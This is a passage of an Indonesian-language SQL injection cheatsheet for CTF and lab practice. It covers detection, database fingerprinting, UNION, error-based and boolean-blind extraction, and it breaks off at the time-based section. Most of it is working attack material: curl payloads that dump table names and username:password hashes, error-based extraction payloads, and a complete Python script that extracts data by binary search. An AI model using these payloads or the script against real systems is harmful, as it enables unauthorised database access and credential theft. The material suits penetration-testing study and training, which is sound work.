---
id: "19"
title: "💉 19 — SQL Injection Workflow"
category: "3. Web Exploitation"
categoryId: "web"
filename: "19_sql_injection_workflow.md"
refs_out: ["05","06","07","14a","17a","18","44","45","63"]
refs_in: ["15","18","20","27","28","30"]
---



# 💉 19 — SQL Injection Workflow

> **Scope:** HackTheBox, TryHackMe, Proving Grounds, dan lab/target yang memang memberikan izin pengujian.  
> **OS:** Parrot OS XFCE / Debian-based  
> **Level:** Beginner → Intermediate  
> **Tujuan:** membangun _muscle memory_ SQL Injection dari detection → identification → exploitation → automation.

---

# 📚 Daftar Isi

- [💉 0. SQL Injection Fundamentals](#-0-sql-injection-fundamentals)
    
- [🔎 1. Detection & Identification](#-1-detection--identification)
    
    - [1.1 Cara Detect SQL Injection](#11-cara-detect-sql-injection)
        
    - [1.2 Identify Database Type](#12-identify-database-type)
        
    - [1.3 Identify Injection Context](#13-identify-injection-context)
        
- [🔗 2. Classic/UNION SQL Injection](#-2-classicunion-sql-injection)
    
    - [2.1 Determine Number of Columns](#21-determine-number-of-columns)
        
    - [2.2 Find Displayable Columns](#22-find-displayable-columns)
        
    - [2.3 UNION SELECT Exploitation](#23-union-select-exploitation)
        
    - [2.4 Useful Queries per Database](#24-useful-queries-per-database)
        
    - [SQLite Cheatsheet](#sqlite-cheatsheet)
        
- [💥 3. Error-Based SQL Injection](#-3-error-based-sql-injection)
    
    - [3.1 MySQL Error-Based](#31-mysql-error-based)
        
    - [3.2 MSSQL Error-Based](#32-mssql-error-based)
        
    - [3.3 PostgreSQL Error-Based](#33-postgresql-error-based)
        
- [🕵️ 4. Boolean Blind SQL Injection](#-4-boolean-blind-sql-injection)
    
    - [4.1 Konsep Boolean Blind](#41-konsep-boolean-blind)
        
    - [4.2 Manual Boolean Extraction](#42-manual-boolean-extraction)
        
    - [4.3 Automation dengan Python](#43-automation-dengan-python)
        
- [⏱️ 5. Time-Based Blind SQL Injection](#-5-time-based-blind-sql-injection)
    
    - [5.1 Konsep Time-Based](#51-konsep-time-based)
        
    - [5.2 Manual Time-Based Test](#52-manual-time-based-test)
        
    - [5.3 Per Database Syntax](#53-per-database-syntax)
        
- [📡 6. Out-of-Band SQL Injection](#-6-out-of-band-sql-injection)
    
    - [6.1 Kapan OOB Dipakai](#61-kapan-oob-dipakai)
        
    - [6.2 DNS Exfiltration](#62-dns-exfiltration-konsep)
        
- [🔁 7. Second-Order SQL Injection](#-7-second-order-sql-injection)
    
    - [7.1 Konsep Second-Order](#71-konsep-second-order)
        
    - [7.2 Cara Identify](#72-cara-identify)
        
- [🤖 8. SQLMap Workflow](#-8-sqlmap-workflow)
    
    - [8.1 Instalasi & Verifikasi](#81-instalasi--verifikasi)
        
    - [8.2 Basic Usage](#82-basic-usage)
        
    - [8.3 Enumeration dengan SQLMap](#83-enumeration-dengan-sqlmap)
        
    - [8.4 Advanced SQLMap](#84-advanced-sqlmap)
        
    - [8.5 SQLMap Output Analysis](#85-sqlmap-output-analysis)
        
- [🛡️ 9. WAF Bypass Techniques](#-9-waf-bypass-techniques)
    
    - [9.1 Common WAF Detection](#91-common-waf-detection)
        
    - [9.2 Bypass Techniques](#92-bypass-techniques)
        
    - [9.3 SQLMap Tamper Scripts](#93-sqlmap-tamper-scripts)
        
- [🧱 10. Stacked Queries](#-10-stacked-queries)
    
    - [10.1 Kapan Stacked Queries Bisa Dipakai](#101-kapan-stacked-queries-bisa-dipakai)
        
    - [10.2 RCE via Stacked Queries](#102-rce-via-stacked-queries)
        
- [💻 11. SQL Injection to RCE](#-11-sql-injection-to-rce)
    
    - [11.1 MySQL — INTO OUTFILE](#111-mysql--into-outfile)
        
    - [11.2 MSSQL — xp_cmdshell](#112-mssql--xp_cmdshell)
        
    - [11.3 PostgreSQL — COPY TOFROM PROGRAM](#113-postgresql--copy-tofrom-program)
        
- [🍃 12. NoSQL Injection](#-12-nosql-injection)
    
    - [12.1 MongoDB Injection](#121-mongodb-injection)
        
    - [12.2 Cara Test NoSQL Injection](#122-cara-test-nosql-injection)
        
- [📨 13. Special Contexts](#-13-special-contexts)
    
    - [13.1 SQLi dalam Cookie](#131-sqli-dalam-cookie)
        
    - [13.2 SQLi dalam HTTP Header](#132-sqli-dalam-http-header)
        
    - [13.3 SQLi dalam JSON Body](#133-sqli-dalam-json-body)
        
    - [13.4 SQLi dalam XML](#134-sqli-dalam-xml)
        
    - [13.5 ORM Injection](#135-orm-injection)
        
- [⚙️ 14. Automation Scripts](#-14-automation-scripts)
    
    - [14.1 Script sqli_detect.sh](#141-script-sqlidetectsh)
        
    - [14.2 One-Liners](#142-one-liners)
        
- [🌳 15. Decision Tree](#-15-decision-tree)
    
- [🛠️ 16. Common Errors & Troubleshooting](#-16-common-errors--troubleshooting)
    
- [⬇️ Post-SQLi: Setelah Dapat Data](#%EF%B8%8F-post-sqli-setelah-dapat-data)
    

---

# 💉 0. SQL Injection Fundamentals

## SQL Query Normal

Misalnya aplikasi menerima:

```text
id=10
```

Backend dapat menjalankan:

```sql
SELECT * FROM products WHERE id=10;
```

Untuk input string:

```text
name=admin
```

query konseptual:

```sql
SELECT * FROM users WHERE name='admin';
```

---

## Bagaimana SQL Injection Terjadi?

Masalah muncul ketika input user langsung digabungkan ke query:

```text
INPUT
  │
  ▼
SQL String Concatenation
  │
  ▼
Database
```

Misalnya:

```text
name=' OR 1=1--
```

Backend yang buruk dapat menghasilkan:

```sql
SELECT * FROM users
WHERE name='' OR 1=1--';
```

Operator:

```text
OR 1=1
```

selalu bernilai TRUE.

---

## Analogi Sederhana

Aplikasi mengharapkan:

```text
"nomor 10"
```

Tetapi user memberikan:

```text
"10 ATAU kondisi selalu benar"
```

Aplikasi tidak membedakan data dengan instruksi SQL.

Itulah inti SQL Injection:

```text
User Input
    │
    ▼
Data
    +
SQL Syntax
    │
    ▼
Altered Query
```

---

## Kenapa Berbahaya?

Tergantung konteks dan permission database, SQLi dapat memungkinkan:

```text
Authentication Bypass
       ↓
Data Enumeration
       ↓
Credential Extraction
       ↓
Sensitive Data Access
       ↓
Database Modification
       ↓
File Read/Write
       ↓
Potential RCE
```

Tidak semua SQLi memiliki seluruh kemampuan tersebut.

---

## In-Band vs Inferential vs Out-of-Band

|Tipe|Cara mendapatkan hasil|
|---|---|
|In-band|Data langsung muncul di response|
|Inferential|Data disimpulkan dari TRUE/FALSE atau timing|
|Out-of-band|Database membuat callback ke sistem lain|

### Diagram

```text
In-band
Request → DB → Response + Data

Inferential
Request → DB
          │
          └→ TRUE/FALSE atau Delay
                    │
                    ▼
                 Infer Data

OOB
Request → DB
          │
          └→ DNS/HTTP Callback
                    │
                    ▼
                 Attacker
```

---

## Normal Query vs Injected Query

```text
NORMAL

User Input
   │
   ▼
id=10
   │
   ▼
SELECT ... WHERE id=10
   │
   ▼
Expected rows


INJECTED

User Input
   │
   ▼
id=10 OR 1=1
   │
   ▼
SELECT ... WHERE id=10 OR 1=1
   │
   ▼
Query behavior changed
```

---

# 🔎 1. Detection & Identification

# 1.1 Cara Detect SQL Injection

## 📌 Kapan Digunakan

Gunakan ketika sebuah parameter dikirimkan ke aplikasi dan Anda menduga nilainya digunakan dalam SQL query.

Kandidat lokasi:

```text
GET parameter
POST parameter
Cookie
HTTP Header
JSON body
XML body
```

---

## Single Quote — GET

Normal:

```bash
curl -i 'http://TARGET/product?id=10'
```

Injection test:

```bash
curl -i 'http://TARGET/product?id=10%27'
```

Atau:

```bash
curl -i --get \
--data-urlencode "id=10'" \
http://TARGET/product
```

---

## Single Quote — POST

```bash
curl -i -X POST http://TARGET/search \
--data-urlencode "q=test'"
```

Bandingkan dengan:

```bash
curl -i -X POST http://TARGET/search \
--data-urlencode "q=test"
```

---

## Single Quote — Cookie

```bash
curl -i http://TARGET/profile \
-H "Cookie: session=test'"
```

---

## Single Quote — Header

```bash
curl -i http://TARGET/ \
-H "User-Agent: test'"
```

Contoh header lain:

```bash
curl -i http://TARGET/ \
-H "X-Forwarded-For: 10.0.0.1'"
```

---

## Single Quote — JSON

```bash
curl -i -X POST http://TARGET/api/search \
-H 'Content-Type: application/json' \
-d '{"search":"test'\"'\"'"}'
```

Lebih mudah dengan file:

```bash
cat > body.json <<'EOF'
{"search":"test'"}
EOF

curl -i -X POST http://TARGET/api/search \
-H 'Content-Type: application/json' \
--data-binary @body.json
```

---

## Yang Dicari dari Response

### SQL Error

Contoh:

```text
You have an error in your SQL syntax
```

MySQL indicator.

PostgreSQL:

```text
ERROR: syntax error at or near
```

MSSQL:

```text
Unclosed quotation mark after the character string
```

Oracle:

```text
ORA-01756
```

SQLite:

```text
near "...": syntax error
```

---

## Generic Error

Kadang aplikasi menyembunyikan SQL error:

```text
500 Internal Server Error
```

atau:

```text
Something went wrong
```

Tetapi baseline:

```text
test    → 200, 1482 bytes
test'   → 500, 931 bytes
```

Perubahan behavior tersebut merupakan indikator.

---

## Boolean Difference

Normal:

```text
?id=10
```

TRUE:

```text
?id=10 AND 1=1
```

FALSE:

```text
?id=10 AND 1=2
```

Bandingkan:

```bash
curl -s 'http://TARGET/product?id=10' -o normal.txt
curl -s 'http://TARGET/product?id=10%20AND%201%3D1' -o true.txt
curl -s 'http://TARGET/product?id=10%20AND%201%3D2' -o false.txt

wc -c normal.txt true.txt false.txt
```

Contoh:

```text
14820 normal.txt
14820 true.txt
  421 false.txt
```

Ini sangat kuat sebagai indikator Boolean Blind.

---

## Time Delay

MySQL:

```bash
time curl -s -o /dev/null \
'http://TARGET/product?id=10%20AND%20SLEEP(5)'
```

PostgreSQL:

```bash
time curl -s -o /dev/null \
'http://TARGET/product?id=10%20AND%201=(SELECT%201%20FROM%20pg_sleep(5))'
```

MSSQL:

```bash
time curl -s -o /dev/null \
'http://TARGET/product?id=10%20WAITFOR%20DELAY%20%2700:00:05%27'
```

---

## Indikator Detection

```text
Single Quote
    │
    ├── SQL Error
    │      └── Error-Based Candidate
    │
    ├── Response Difference
    │      └── Boolean Candidate
    │
    ├── Significant Delay
    │      └── Time-Based Candidate
    │
    └── No Change
           └── Test Context / Encoding / Other Parameter
```

---

# 1.2 Identify Database Type

## 📌 Kapan Digunakan

Setelah menemukan indikasi SQLi dan perlu memilih syntax yang tepat.

|Indikator|Database|
|---|---|
|`You have an error in your SQL syntax`|MySQL/MariaDB|
|`mysqli`|MySQL/MariaDB|
|`PDOException` + MySQL driver|MySQL/MariaDB|
|`pg_query`, `PG::`|PostgreSQL|
|`syntax error at or near`|PostgreSQL|
|`Unclosed quotation mark`|MSSQL|
|`Microsoft SQL Server`|MSSQL|
|`SQLSTATE[HY000]`|Bisa tergantung driver|
|`ORA-01756`|Oracle|
|`ORA-00933`|Oracle|
|`SQLiteException`|SQLite|
|`near "...": syntax error`|SQLite|

---

## Syntax Fingerprinting

### MySQL

```sql
SELECT @@version;
```

### PostgreSQL

```sql
SELECT version();
```

### MSSQL

```sql
SELECT @@VERSION;
```

### Oracle

```sql
SELECT banner FROM v$version;
```

### SQLite

```sql
SELECT sqlite_version();
```

---

# 1.3 Identify Injection Context

## String Context

Query:

```sql
WHERE name='INPUT'
```

Test:

```text
'
''
' OR 1=1-- -
' OR 1=1#
```

> ⚠️ **Catatan Kritis SQL Comment (MySQL vs Lainnya):**
> - **MySQL:** Wajib menyertakan spasi setelah tanda minus ganda (`-- ` atau `-- -`) atau menggunakan tanda pagar (`#` / `%23`). Penggunaan `--` tanpa spasi akan menghasilkan error di MySQL.
> - **MSSQL / PostgreSQL / SQLite:** Mendukung `--` standar tanpa spasi.

---

## Numeric Context

Query:

```sql
WHERE id=INPUT
```

Test:

```text
10
10'
10 AND 1=1
10 AND 1=2
```

Command:

```bash
curl -i 'http://TARGET/item?id=10%20AND%201%3D1'
```

---

## Inside Quotes

Contoh:

```sql
WHERE username='INPUT'
```

Payload:

```text
admin'
admin'-- -
admin'#
```

---

## Inside Comments

Jika aplikasi memotong input:

```text
input/*test*/
```

atau:

```text
input-- -
```

Eksperimen harus disesuaikan dengan DB dialect.

---

## Inside Subquery

Contoh konseptual:

```sql
SELECT *
FROM users
WHERE id=(SELECT INPUT);
```

Test:

```text
1
1+1
1)
```

Tujuan utama:

```text
mengetahui grammar position
```

---

## Context Testing Diagram

```text
Parameter
   │
   ▼
Guess context
   │
   ├── String → ' OR ...
   ├── Numeric → 1 OR ...
   ├── Quoted  → close quote
   ├── Comment → comment closure
   └── Subquery → close parenthesis
```

---

# 🔗 2. Classic/UNION SQL Injection

> **Ini adalah bagian yang paling penting untuk muscle memory CTF.**

---

# 2.1 Determine Number of Columns

## 📌 Kapan Digunakan

Gunakan sebelum `UNION SELECT`.

Tujuan:

```text
menyamakan jumlah kolom query asli
dengan jumlah kolom SELECT yang di-inject.
```

---

## ORDER BY Method

Misalnya:

```text
?id=10
```

Coba:

```bash
curl -s 'http://TARGET/product?id=10%20ORDER%20BY%201'
```

Kemudian:

```bash
curl -s 'http://TARGET/product?id=10%20ORDER%20BY%202'
```

Lanjut:

```text
3
4
5
...
```

Misalnya:

```text
ORDER BY 1 → normal
ORDER BY 2 → normal
ORDER BY 3 → normal
ORDER BY 4 → error
```

Maka kemungkinan:

```text
jumlah column = 3
```

Diagram:

```text
ORDER BY 1 ✅
ORDER BY 2 ✅
ORDER BY 3 ✅
ORDER BY 4 ❌
        │
        ▼
   3 columns
```

---

## NULL Method

Jika query:

```text
?id=10 UNION SELECT ...
```

uji:

```bash
curl -s \
'http://TARGET/product?id=10%20UNION%20SELECT%20NULL--%20-'
```

Jika error:

```text
column mismatch
```

coba:

```bash
curl -s \
'http://TARGET/product?id=10%20UNION%20SELECT%20NULL,NULL--%20-'
```

Kemudian:

```bash
curl -s \
'http://TARGET/product?id=10%20UNION%20SELECT%20NULL,NULL,NULL--%20-'
```

Contoh:

```text
1 NULL     → error
2 NULL     → error
3 NULL     → success
```

Kesimpulan:

```text
3 columns
```

> ⚠️ **Oracle Special:** Di Oracle Database, seluruh query `SELECT` **wajib** memiliki `FROM` clause.
> Gunakan tabel dummy bawaan Oracle yaitu `FROM DUAL`:
> ```sql
> ORDER BY 1--
> UNION SELECT NULL FROM DUAL--
> UNION SELECT NULL,NULL FROM DUAL--
> UNION SELECT NULL,NULL,NULL FROM DUAL--
> ```

---

# 2.2 Find Displayable Columns

## 📌 Kapan Digunakan

Setelah mengetahui jumlah kolom.

Misalnya:

```text
3 columns
```

Gunakan:

```text
UNION SELECT 'A','B','C'
```

Command:

```bash
curl -s \
'http://TARGET/product?id=10%20UNION%20SELECT%20%27A%27,%27B%27,%27C%27--%20-'
```

Expected:

```text
Product: A
Description: B
Price: C
```

Artinya:

```text
column 1 → displayable
column 2 → displayable
column 3 → displayable
```

Contoh lain:

```text
column 1 → tidak terlihat
column 2 → "B"
column 3 → "C"
```

Maka:

```text
2 dan 3 = displayable
```

---

# 2.3 UNION SELECT Exploitation

## 📌 Kapan Digunakan

Gunakan ketika:

```text
UNION berhasil
AND
jumlah kolom diketahui
AND
minimal satu column dapat ditampilkan
```

---

## Step A — Confirm Column Count

Contoh:

```text
ORDER BY 4 → error
```

Kesimpulan:

```text
3 columns
```

Confirm:

```bash
curl -s \
'http://TARGET/product?id=10%20UNION%20SELECT%20NULL,NULL,NULL--%20-'
```

Expected:

```text
HTTP 200
```

---

## Step B — Find String Columns

```bash
curl -s \
'http://TARGET/product?id=10%20UNION%20SELECT%20%27A%27,%27B%27,%27C%27--%20-'
```

Expected output:

```text
Product: A
Description: B
Price: C
```

---

## Step C — Extract Database Name

### MySQL

```text
database()
```

Payload:

```bash
curl -s \
'http://TARGET/product?id=10%20UNION%20SELECT%20database(),%27B%27,%27C%27--%20-'
```

Output:

```text
Product: shopdb
Description: B
Price: C
```

---

### PostgreSQL

```sql
current_database()
```

Command:

```bash
curl -s \
'http://TARGET/product?id=10%20UNION%20SELECT%20current_database(),%27B%27,%27C%27--%20-'
```

Output:

```text
Product: appdb
```

---

### MSSQL

```sql
DB_NAME()
```

Command:

```bash
curl -s \
'http://TARGET/product?id=10%20UNION%20SELECT%20DB_NAME(),%27B%27,%27C%27--%20-'
```

Output:

```text
Product: webapp
```

---

## Step D — Extract Table Names

### MySQL

```sql
SELECT table_name
FROM information_schema.tables
WHERE table_schema=database()
```

Dengan `GROUP_CONCAT`:

```bash
curl -s \
'http://TARGET/product?id=10%20UNION%20SELECT%20GROUP_CONCAT(table_name),%27B%27,%27C%27%20FROM%20information_schema.tables%20WHERE%20table_schema=database()--%20-'
```

Contoh:

```text
Product:
users,products,orders
```

---

### PostgreSQL

```sql
SELECT string_agg(table_name,',')
FROM information_schema.tables
WHERE table_schema='public'
```

Contoh:

```text
users,products,sessions
```

---

### MSSQL

```sql
SELECT STRING_AGG(name,',')
FROM sys.tables
```

Contoh:

```text
users,orders,customers
```

---

## Step E — Extract Column Names

### MySQL

```bash
curl -s \
'http://TARGET/product?id=10%20UNION%20SELECT%20GROUP_CONCAT(column_name),%27B%27,%27C%27%20FROM%20information_schema.columns%20WHERE%20table_name=%27users%27--%20-'
```

Expected:

```text
id,username,password,email
```

---

### PostgreSQL

```sql
SELECT string_agg(column_name,',')
FROM information_schema.columns
WHERE table_name='users'
```

---

### MSSQL

```sql
SELECT STRING_AGG(c.name,',')
FROM sys.columns c
JOIN sys.tables t ON c.object_id=t.object_id
WHERE t.name='users'
```

---

## Step F — Extract Data

Misalnya:

```text
users
 ├── username
 └── password
```

### MySQL

```bash
curl -s \
'http://TARGET/product?id=10%20UNION%20SELECT%20GROUP_CONCAT(username,0x3a,password),%27B%27,%27C%27%20FROM%20users--%20-'
```

Expected:

```text
admin:5f4dcc3b5aa765d61d8327deb882cf99
guest:084e0343a0486ff05530df6c705c8bb4
```

---

### `CONCAT()` Version

```sql
CONCAT(username,':',password)
```

---

## Complete UNION Flow

```text
Find Parameter
      │
      ▼
Single Quote
      │
      ▼
Confirm SQLi
      │
      ▼
ORDER BY
      │
      ▼
Column Count
      │
      ▼
UNION SELECT NULL...
      │
      ▼
Find Displayable Columns
      │
      ▼
DB Name
      │
      ▼
Table Names
      │
      ▼
Column Names
      │
      ▼
Data
```

---

# 2.4 Useful Queries per Database

## Version

|Info|MySQL|PostgreSQL|MSSQL|Oracle|SQLite|
|---|---|---|---|---|---|
|Version|`@@version` / `version()`|`version()`|`@@VERSION`|`banner FROM v$version`|`sqlite_version()`|
|Current DB|`database()`|`current_database()`|`DB_NAME()`|`SYS_CONTEXT('USERENV','DB_NAME')`|`'main'` (file-based)|
|Current User|`USER()`|`current_user`|`SYSTEM_USER` / `SUSER_SNAME()`|`USER`|`'N/A'` (user proses OS)|
|All Databases|`information_schema` / `SHOW DATABASES`|`pg_database`|`sys.databases`|`ALL_USERS` / schemas|`PRAGMA database_list`|
|All Tables|`information_schema.tables`|`information_schema.tables`|`sys.tables`|`all_tables`|`sqlite_master WHERE type='table'`|
|All Columns|`information_schema.columns`|`information_schema.columns`|`sys.columns`|`all_tab_columns`|`sql FROM sqlite_master` / `table_info()`|
|Privileges|`information_schema.user_privileges`|`information_schema.role_*`|`fn_my_permissions()`|`session_privs`|`'N/A'` (file permissions OS)|

---

## MySQL Cheatsheet

### Version

```sql
SELECT @@version;
```

### Current DB

```sql
SELECT database();
```

### Current User

```sql
SELECT user();
```

### Databases

```sql
SHOW DATABASES;
```

### Tables

```sql
SELECT table_name
FROM information_schema.tables
WHERE table_schema=database();
```

### Columns

```sql
SELECT column_name
FROM information_schema.columns
WHERE table_name='users'
AND table_schema=database();
```

### Privileges

```sql
SELECT * FROM information_schema.user_privileges;
```

---

## PostgreSQL Cheatsheet

### Version

```sql
SELECT version();
```

### Current DB

```sql
SELECT current_database();
```

### Current User

```sql
SELECT current_user;
```

### Databases

```sql
SELECT datname FROM pg_database;
```

### Tables

```sql
SELECT table_name
FROM information_schema.tables
WHERE table_schema='public';
```

### Columns

```sql
SELECT column_name
FROM information_schema.columns
WHERE table_schema='public'
AND table_name='users';
```

### Roles/Privileges

```sql
SELECT current_user;
```

Role inspection:

```sql
SELECT rolname, rolsuper, rolcreaterole, rolcreatedb
FROM pg_roles;
```

---

## MSSQL Cheatsheet

### Version

```sql
SELECT @@VERSION;
```

### Current DB

```sql
SELECT DB_NAME();
```

### Current User

```sql
SELECT SYSTEM_USER;
```

### Databases

```sql
SELECT name FROM sys.databases;
```

### Tables

```sql
SELECT name FROM sys.tables;
```

### Columns

```sql
SELECT name
FROM sys.columns
WHERE object_id=OBJECT_ID('dbo.users');
```

### Privileges

```sql
SELECT *
FROM fn_my_permissions(NULL, 'DATABASE');
```

---

## Oracle Cheatsheet

### Version

```sql
SELECT banner FROM v$version;
```

### Current DB

```sql
SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual;
```

### Current User

```sql
SELECT USER FROM dual;
```

### Schemas/Users

```sql
SELECT username FROM all_users;
```

### Tables

```sql
SELECT table_name FROM all_tables;
```

### Columns

```sql
SELECT column_name
FROM all_tab_columns
WHERE table_name='USERS';
```

### Privileges

```sql
SELECT privilege FROM session_privs;
```

---

## SQLite Cheatsheet

### Version
```sql
SELECT sqlite_version();
```

### Tables
```sql
SELECT name FROM sqlite_master WHERE type='table';
```

### Columns & Table Schema
```sql
-- Membaca definisi pembuatan tabel (memuat seluruh nama kolom):
SELECT sql FROM sqlite_master WHERE type='table' AND name='users';

-- ATAU via PRAGMA (jika multi-statement query didukung):
PRAGMA table_info(users);
```

### Data Extraction
```sql
-- Menggabungkan seluruh baris username & password menjadi satu string:
SELECT group_concat(username || ':' || password) FROM users;
```

### Karakteristik Kritis SQLite di CTF:
- **Tidak Memiliki `information_schema`:** SQLite TIDAK memiliki katalog schema standar. Selalu gunakan `sqlite_master` sebagai gantinya.
- **Tidak Ada Native `SLEEP()`:** SQLite tidak memiliki fungsi delay bawaan. Timing-based blind SQLi umumnya tidak bisa dilakukan secara langsung (harus mengandalkan query komputasi berat/randomblob jika didukung).
- **File-Based Security:** Tidak ada sistem user database terpisah; hak akses database sepenuhnya diatur oleh file permissions sistem operasi (`.sqlite`, `.db`, `.sqlite3`).

---

# 💥 3. Error-Based SQL Injection

# 3.1 MySQL Error-Based

## 📌 Kapan Digunakan

Saat database error ditampilkan dan fungsi error dapat memaksa data muncul di error message.

---

## ExtractValue

Contoh payload:

```sql
AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))
```

Encoded curl:

```bash
curl -s \
'http://TARGET/product?id=10%20AND%20EXTRACTVALUE(1,CONCAT(0x7e,(SELECT%20database()),0x7e))'
```

Expected:

```text
XPATH syntax error: '~shopdb~'
```

---

## UpdateXML

```sql
AND UPDATEXML(NULL,CONCAT(0x7e,(SELECT database()),0x7e),NULL)
```

Command:

```bash
curl -s \
'http://TARGET/product?id=10%20AND%20UPDATEXML(NULL,CONCAT(0x7e,(SELECT%20database()),0x7e),NULL)'
```

Expected:

```text
XPATH syntax error: '~shopdb~'
```

> Teknik ini bergantung pada database/version dan fungsi yang tersedia.

---

# 3.2 MSSQL Error-Based

## 📌 Kapan Digunakan

Saat MSSQL mengembalikan type-conversion errors yang dapat membawa nilai query.

Contoh pola:

```sql
AND 1=CONVERT(int,(SELECT TOP 1 name FROM sys.databases))
```

Command:

```bash
curl -s \
'http://TARGET/item?id=10%20AND%201=CONVERT(int,(SELECT%20TOP%201%20name%20FROM%20sys.databases))'
```

Expected:

```text
Conversion failed when converting the nvarchar value 'master' to data type int.
```

Artinya:

```text
Data muncul di error message
```

---

# 3.3 PostgreSQL Error-Based

## 📌 Kapan Digunakan

Saat PostgreSQL memberikan error detail dan type cast dapat dipakai untuk membuat error berisi data.

Contoh:

```sql
CAST((SELECT current_database()) AS integer)
```

Command:

```bash
curl -s \
'http://TARGET/item?id=10%20AND%201=CAST((SELECT%20current_database())%20AS%20integer)'
```

Expected:

```text
invalid input syntax for type integer: "appdb"
```

---

# 🕵️ 4. Boolean Blind SQL Injection

# 4.1 Konsep Boolean Blind

## 📌 Kapan Digunakan

Saat:

```text
SQLi ada
BUT
database result tidak tampil
AND
SQL error tidak muncul.
```

Anda mengandalkan:

```text
TRUE response
vs
FALSE response
```

---

## Diagram

```text
             Injection
                 │
                 ▼
          SQL Condition
            /        \
         TRUE        FALSE
          │            │
          ▼            ▼
    Response A     Response B
          │            │
          └─────┬──────┘
                ▼
           Compare
                │
                ▼
            Infer Data
```

---

## Detect Boolean Blind

Normal:

```bash
curl -s 'http://TARGET/item?id=10' -o normal
```

TRUE:

```bash
curl -s \
'http://TARGET/item?id=10%20AND%201=1' -o true
```

FALSE:

```bash
curl -s \
'http://TARGET/item?id=10%20AND%201=2' -o false
```

Bandingkan:

```bash
wc -c normal true false
```

---

# 4.2 Manual Boolean Extraction

## 📌 Kapan Digunakan

Saat Boolean difference sudah terbukti dan ingin mengambil data sedikit demi sedikit.

Misalnya target:

```text
database = shopdb
```

Kita tidak melihat hasil langsung.

---

## Konsep SUBSTRING

MySQL:

```sql
SUBSTRING(database(),1,1)
```

Ambil karakter pertama:

```sql
SUBSTRING(database(),1,1)='s'
```

Jika TRUE:

```text
database dimulai dengan s
```

---

## ASCII

```sql
ASCII(SUBSTRING(database(),1,1)) > 100
```

Jika TRUE:

```text
ASCII karakter pertama > 100
```

Kemudian gunakan binary search:

```text
> 100?
> 110?
> 115?
> 113?
```

---

## Manual Example

Test:

```bash
curl -s \
'http://TARGET/item?id=10%20AND%20ASCII(SUBSTRING(database(),1,1))%3E100' \
-o result.txt
```

Cari indikator TRUE:

```bash
grep -q 'Product' result.txt && echo "TRUE" || echo "FALSE"
```

Kemudian:

```bash
curl -s \
'http://TARGET/item?id=10%20AND%20ASCII(SUBSTRING(database(),1,1))%3E115' \
-o result.txt
```

Output:

```text
FALSE
```

Maka:

```text
ASCII(character 1) <= 115
```

Test:

```text
> 110 → TRUE
> 115 → FALSE
```

Akhirnya:

```text
ASCII = 115
```

`115 = s`

Karakter pertama:

```text
s
```

---

## Character-by-Character

```text
position=1 → s
position=2 → h
position=3 → o
position=4 → p
position=5 → d
position=6 → b
```

Hasil:

```text
shopdb
```

---

# 4.3 Automation dengan Python

## 📌 Kapan Digunakan

Saat manual extraction berhasil tetapi terlalu lambat.

Script berikut:

- menerima URL
    
- menerima parameter
    
- mendeteksi TRUE berdasarkan marker
    
- melakukan binary search ASCII
    
- mencoba database name
    
- melakukan input validation
    

```python
#!/usr/bin/env python3

import argparse
import sys
import time
from urllib.parse import urlparse

import requests


def valid_url(value: str) -> str:
    parsed = urlparse(value)

    if parsed.scheme not in ("http", "https"):
        raise argparse.ArgumentTypeError(
            "URL must start with http:// or https://"
        )

    if not parsed.netloc:
        raise argparse.ArgumentTypeError("Invalid URL")

    return value


def valid_identifier(value: str) -> str:
    if not value.replace("_", "").replace("-", "").isalnum():
        raise argparse.ArgumentTypeError(
            "Parameter must contain only letters, numbers, _ or -"
        )

    return value


def get_params():
    parser = argparse.ArgumentParser(
        description="Simple Boolean Blind SQLi extractor for authorized labs."
    )

    parser.add_argument(
        "url",
        type=valid_url,
        help="Target URL"
    )

    parser.add_argument(
        "-p",
        "--parameter",
        required=True,
        type=valid_identifier,
        help="Injectable parameter name"
    )

    parser.add_argument(
        "-m",
        "--marker",
        required=True,
        help="Text that exists in TRUE response but not FALSE response"
    )

    parser.add_argument(
        "-c",
        "--characters",
        type=int,
        default=20,
        help="Maximum characters to extract"
    )

    parser.add_argument(
        "-t",
        "--timeout",
        type=float,
        default=10.0,
        help="HTTP timeout"
    )

    return parser.parse_args()


def is_true(
    session: requests.Session,
    url: str,
    parameter: str,
    payload: str,
    marker: str,
    timeout: float
) -> bool:

    try:
        response = session.get(
            url,
            params={parameter: payload},
            timeout=timeout
        )
    except requests.RequestException as exc:
        print(f"\n[!] Request error: {exc}", file=sys.stderr)
        return False

    return marker in response.text


def extract_db_name(
    session: requests.Session,
    url: str,
    parameter: str,
    marker: str,
    max_length: int,
    timeout: float
) -> str:

    result = []

    print("[*] Starting database-name extraction")

    for position in range(1, max_length + 1):

        # First determine whether another character exists.
        existence_payload = (
            "10 AND "
            f"ASCII(SUBSTRING(database(),{position},1))>0"
        )

        if not is_true(
            session,
            url,
            parameter,
            existence_payload,
            marker,
            timeout
        ):
            break

        low = 32
        high = 126

        while low <= high:
            mid = (low + high) // 2

            payload = (
                "10 AND "
                f"ASCII(SUBSTRING(database(),{position},1))>{mid}"
            )

            if is_true(
                session,
                url,
                parameter,
                payload,
                marker,
                timeout
            ):
                low = mid + 1
            else:
                high = mid - 1

        char_code = low

        if char_code < 32 or char_code > 126:
            break

        char = chr(char_code)
        result.append(char)

        print(
            f"\r[+] Progress: {''.join(result)}",
            end="",
            flush=True
        )

        time.sleep(0.05)

    print()

    return "".join(result)


def main():
    args = get_params()

    session = requests.Session()
    session.headers.update({
        "User-Agent": "CTF-SQLi-Lab-Testing"
    })

    result = extract_db_name(
        session=session,
        url=args.url,
        parameter=args.parameter,
        marker=args.marker,
        max_length=args.characters,
        timeout=args.timeout
    )

    if result:
        print(f"[+] Database: {result}")
    else:
        print("[-] Could not extract database name.")
        print("[-] Verify marker, parameter and SQL dialect.")


if __name__ == "__main__":
    main()
```

Install dependency:

```bash
python3 -m pip install requests
```

Jalankan:

```bash
python3 blind_sqli.py \
'http://TARGET/item' \
-p id \
-m 'Product'
```

Contoh:

```text
[*] Starting database-name extraction
[+] Progress: s
[+] Progress: sh
[+] Progress: sho
[+] Progress: shop
[+] Progress: shopd
[+] Progress: shopdb

[+] Database: shopdb
```

> Script di atas memakai sintaks MySQL/MariaDB (`database()` dan `SUBSTRING()`). Untuk PostgreSQL/MSSQL, expression database harus diubah.

---

# ⏱️ 5. Time-Based Blind SQL Injection

# 5.1 Konsep Time-Based

## 📌 Kapan Digunakan

Gunakan saat:

```text
Tidak ada output
Tidak ada visible boolean difference
